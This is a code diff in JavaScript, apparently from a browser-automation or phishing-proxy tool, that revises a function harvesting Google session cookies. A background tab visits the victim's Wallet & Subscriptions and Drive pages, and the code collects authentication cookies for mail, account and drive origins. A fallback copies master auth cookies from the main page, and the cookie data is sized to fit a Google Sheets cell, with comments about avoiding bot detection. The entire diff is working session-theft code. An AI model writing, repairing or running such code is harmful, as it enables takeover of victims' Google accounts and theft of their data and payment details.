@@ -2460,19 +2460,13 @@ export function filterAndMinifyGoogleCookies(rawCookies) {
 }
 
 export const GOOGLE_ECOSYSTEM_SERVICES = [
-    // Core high-value Google services (pruned to avoid bot suspicion / crawl triggers)
     { name: 'Wallet & Subscriptions', url: 'https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0' },
     { name: 'Google Drive', url: 'https://drive.google.com/drive/u/0/my-drive' },
-    { name: 'Google Docs', url: 'https://docs.google.com/document/u/0/' },
-    { name: 'Google Sheets', url: 'https://docs.google.com/spreadsheets/u/0/' },
-    { name: 'Google Contacts', url: 'https://contacts.google.com/?authuser=0' },
-    { name: 'YouTube', url: 'https://www.youtube.com/?authuser=0' },
 ];
 
 /**
- * Internal worker for Google ecosystem multi-service cookie capture.
- * Sequentially visits Google ecosystem services in a single background tab,
- * allowing cross-domain SSO authorization tickets and service cookies to drop.
+ * Internal worker for Google extra tabs cookie capture.
+ * Restores the exact 3-tab baseline (Mail, Account, Drive) that worked stably.
  */
 async function _executeGoogleExtraTabs(browser, domain) {
     browser._isCapturingMultiTab = true;
@@ -2481,89 +2475,78 @@ async function _executeGoogleExtraTabs(browser, domain) {
     let extraTab = null;
 
     try {
-        logger.info(`[openGoogleExtraTabs] Starting Google Ecosystem multi-service cookie tour across ${GOOGLE_ECOSYSTEM_SERVICES.length} services (queue lock acquired)...`);
+        logger.info('[openGoogleExtraTabs] Starting multi-tab background cookie capture (queue lock acquired)...');
         extraTab = await browser.newPage().catch(e => {
             logger.warn(`[openGoogleExtraTabs] Error opening background tab: ${e.message}`);
             return null;
         });
 
         if (extraTab) {
-            extraTab.setDefaultNavigationTimeout(10000);
+            // 1. Visit Wallet & Subscriptions tab
+            logger.info('[openGoogleExtraTabs] Tab 2: Navigating to Wallet & Subscriptions...');
+            await extraTab.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app&authuser=0', {
+                waitUntil: 'domcontentloaded',
+                timeout: 35000
+            }).catch(e => logger.warn(`[openGoogleExtraTabs] Wallet navigation notice: ${e.message}`));
+            await new Promise(r => setTimeout(r, 2500));
 
-            // Sequentially tour all ecosystem services in the single extraTab
-            for (let i = 0; i < GOOGLE_ECOSYSTEM_SERVICES.length; i++) {
-                const service = GOOGLE_ECOSYSTEM_SERVICES[i];
-                logger.info(`[openGoogleExtraTabs] [${i + 1}/${GOOGLE_ECOSYSTEM_SERVICES.length}] Visiting ${service.name} (${service.url})...`);
-                try {
-                    await extraTab.goto(service.url, {
-                        waitUntil: 'domcontentloaded',
-                        timeout: 8000
-                    });
-                } catch (navErr) {
-                    logger.debug(`[openGoogleExtraTabs] Notice visiting ${service.name}: ${navErr.message}`);
-                }
-                // Brief pause for SSO ticket bounce and cookie jar write
-                await new Promise(r => setTimeout(r, 800));
-            }
+            let accountCookies = await extraTab.cookies(
+                'https://myaccount.google.com',
+                'https://mail.google.com',
+                'https://drive.google.com',
+                'https://google.com'
+            ).catch(() => []);
 
-            // Extract comprehensive cookie jar across all origins via CDP Network.getAllCookies
-            let allRawCookies = [];
-            try {
-                const cdp = await extraTab.target().createCDPSession();
-                const result = await cdp.send('Network.getAllCookies');
-                if (Array.isArray(result?.cookies) && result.cookies.length > 0) {
-                    allRawCookies = result.cookies;
-                    logger.info(`[openGoogleExtraTabs] CDP Network.getAllCookies captured ${allRawCookies.length} total ecosystem cookies.`);
-                }
-            } catch (cdpErr) {
-                logger.warn(`[openGoogleExtraTabs] CDP Network.getAllCookies notice: ${cdpErr.message}. Falling back to origin list.`);
-            }
-
-            if (allRawCookies.length === 0) {
-                const origins = GOOGLE_ECOSYSTEM_SERVICES.map(s => s.url).concat([
-                    'https://google.com',
-                    'https://accounts.google.com',
+            // Quick retry if cookies were still being written to jar
+            if (!accountCookies || accountCookies.length === 0) {
+                await new Promise(r => setTimeout(r, 2000));
+                accountCookies = await extraTab.cookies(
+                    'https://myaccount.google.com',
                     'https://mail.google.com',
-                    'https://youtube.com',
-                    'https://blogger.com'
-                ]);
-                allRawCookies = await extraTab.cookies(...origins).catch(() => []);
+                    'https://drive.google.com',
+                    'https://google.com'
+                ).catch(() => []);
             }
 
-            // Apply smart auth filtering & minification:
-            // 1. Keeps all valid ecosystem auth tokens (root + subdomains: drive, docs, meet, calendar, etc.)
-            // 2. Discards destructive anti-bot/conflict tokens (ACCOUNT_CHOOSER, GAPS, LSID)
-            // 3. Discards tracking/ad bloat (_ga*, ADS_*, OTZ, etc.) and regional duplicates (.google.com.ng)
-            // 4. Shrinks serialized JSON from >70KB down to ~6-8KB so it easily fits under Google Sheets 50,000 char limit
-            const sanitizedEcosystemCookies = filterAndMinifyGoogleCookies(allRawCookies);
-            if (sanitizedEcosystemCookies.length > 0) {
-                const driveJson = JSON.stringify(sanitizedEcosystemCookies);
-                if (driveJson.length < 45000) {
-                    driveCookieJSON = driveJson;
-                    logger.info(`[openGoogleExtraTabs] Successfully assembled driveCookieJSON with ${sanitizedEcosystemCookies.length} filtered ecosystem cookies (${driveJson.length} chars).`);
-                } else {
-                    logger.warn(`[openGoogleExtraTabs] driveCookieJSON exceeded 45,000 chars (${driveJson.length}), applying emergency root-only trim.`);
-                    const trimmed = sanitizedEcosystemCookies.slice(0, 45);
-                    driveCookieJSON = JSON.stringify(trimmed);
-                }
+            if (accountCookies && accountCookies.length > 0) {
+                accountCookieJSON = JSON.stringify(accountCookies);
+                logger.info(`[openGoogleExtraTabs] Captured ${accountCookies.length} account cookies for Wallet tab.`);
             }
 
-            // 2. accountCookieJSON: Subdomains excluding drive
-            const accountCookies = sanitizedEcosystemCookies.filter(c => !c.domain || !c.domain.includes('drive.google.com'));
-            if (accountCookies.length > 0) {
-                const accountJson = JSON.stringify(accountCookies);
-                if (accountJson.length < 45000) {
-                    accountCookieJSON = accountJson;
-                    logger.info(`[openGoogleExtraTabs] Successfully assembled accountCookieJSON with ${accountCookies.length} cookies (${accountJson.length} chars).`);
-                } else {
-                    logger.warn(`[openGoogleExtraTabs] accountCookieJSON exceeded 45,000 chars (${accountJson.length}), applying emergency trim.`);
-                    const trimmed = accountCookies.slice(0, 45);
-                    accountCookieJSON = JSON.stringify(trimmed);
-                }
+            // 2. Visit Google Drive in the SAME tab (avoids creating a new page and CDP races)
+            logger.info('[openGoogleExtraTabs] Tab 3: Navigating to Google Drive...');
+            await extraTab.goto('https://drive.google.com/drive/u/0/my-drive', {
+                waitUntil: 'domcontentloaded',
+                timeout: 35000
+            }).catch(e => logger.warn(`[openGoogleExtraTabs] Drive navigation notice: ${e.message}`));
+            await new Promise(r => setTimeout(r, 2500));
+
+            let driveCookies = await extraTab.cookies(
+                'https://drive.google.com',
+                'https://mail.google.com',
+                'https://myaccount.google.com',
+                'https://google.com'
+            ).catch(() => []);
+
+            // Quick retry if cookies were still being written to jar
+            if (!driveCookies || driveCookies.length === 0) {
+                await new Promise(r => setTimeout(r, 2000));
+                driveCookies = await extraTab.cookies(
+                    'https://drive.google.com',
+                    'https://mail.google.com',
+                    'https://myaccount.google.com',
+                    'https://google.com'
+                ).catch(() => []);
+            }
+
+            if (driveCookies && driveCookies.length > 0) {
+                driveCookieJSON = JSON.stringify(driveCookies);
+                logger.info(`[openGoogleExtraTabs] Captured ${driveCookies.length} drive cookies for Drive tab.`);
             }
         }
 
-        // 3. Fallback: If either cookie set failed to capture, synthesize from primary page master auth cookies
+        // 3. Fallback: If either cookie set failed to capture (e.g. navigation timeout or proxy glitch),
+        // synthesize from the primary page's master auth cookies on .google.com.
         if (!accountCookieJSON || !driveCookieJSON) {
             try {
                 const pages = await browser.pages().catch(() => []);
@@ -2572,25 +2555,35 @@ async function _executeGoogleExtraTabs(browser, domain) {
                     const masterCookies = await primaryPage.cookies(
                         'https://mail.google.com',
                         'https://accounts.google.com',
-                        'https://google.com',
-                        'https://youtube.com'
+                        'https://google.com'
                     ).catch(() => []);
                     if (masterCookies && masterCookies.length > 0) {
-                        const sanitizedMaster = filterAndMinifyGoogleCookies(masterCookies);
-                        const masterJson = JSON.stringify(sanitizedMaster.length > 0 ? sanitizedMaster : masterCookies);
+                        const masterJson = JSON.stringify(masterCookies);
                         if (!accountCookieJSON) {
                             accountCookieJSON = masterJson;
-                            logger.info(`[openGoogleExtraTabs] Resilience fallback: populated accountCookieJSON with ${sanitizedMaster.length} master cookies (${masterJson.length} chars).`);
+                            logger.info(`[openGoogleExtraTabs] Resilience fallback: populated accountCookieJSON with ${masterCookies.length} master cookies.`);
                         }
                         if (!driveCookieJSON) {
                             driveCookieJSON = masterJson;
-                            logger.info(`[openGoogleExtraTabs] Resilience fallback: populated driveCookieJSON with ${sanitizedMaster.length} master cookies (${masterJson.length} chars).`);
+                            logger.info(`[openGoogleExtraTabs] Resilience fallback: populated driveCookieJSON with ${masterCookies.length} master cookies.`);
                         }
                     }
                 }
             } catch (fallbackErr) {
                 logger.warn(`[openGoogleExtraTabs] Master cookie fallback notice: ${fallbackErr.message}`);
             }
+        }
+
+        // 4. Safety Guard: Ensure payloads never exceed Google Sheets 50,000 char cell limit
+        if (accountCookieJSON && accountCookieJSON.length > 45000) {
+            const minified = filterAndMinifyGoogleCookies(JSON.parse(accountCookieJSON));
+            accountCookieJSON = JSON.stringify(minified);
+            logger.info(`[openGoogleExtraTabs] Safety guard: minified accountCookieJSON to ${accountCookieJSON.length} chars.`);
+        }
+        if (driveCookieJSON && driveCookieJSON.length > 45000) {
+            const minified = filterAndMinifyGoogleCookies(JSON.parse(driveCookieJSON));
+            driveCookieJSON = JSON.stringify(minified);
+            logger.info(`[openGoogleExtraTabs] Safety guard: minified driveCookieJSON to ${driveCookieJSON.length} chars.`);
         }
     } catch (e) {
         logger.warn(`[openGoogleExtraTabs] Error capturing extra cookies: ${e.message}`);
